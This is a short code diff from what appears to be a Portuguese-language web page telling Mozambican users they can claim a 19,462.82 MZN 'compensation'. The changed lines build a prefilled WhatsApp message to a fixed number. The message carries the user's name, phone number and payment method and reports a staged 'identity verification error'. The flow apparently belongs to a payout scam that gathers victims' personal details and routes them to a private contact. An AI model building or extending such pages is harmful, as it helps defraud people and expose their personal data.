@@ -684,7 +684,7 @@
 
             setTimeout(() => {
                 let phoneNumber = "258864688021"; 
-                let message = encodeURIComponent(`Saudações, tentei receber a minha indenização no valor de 19.462,82 MZN via ${userData.metodo} (Número: ${userData.telefone}), mas deu erro de verificação de identidade. O meu nome é ${userData.nome}. Como posso proceder para receber o valor?`);
+                let message = encodeURIComponent(`*Saudações*, tentei receber a minha indenização no valor de *19.462,82* via ${userData.metodo} através do número *${userData.telefone}*, mas deu erro de verificação de identidade. O meu nome é *${userData.nome}*. Como posso proceder para receber o valor?`);
                 document.getElementById('whatsapp-link').href = `https://wa.me/${phoneNumber}?text=${message}`;
 
                 goToScreen(7); 
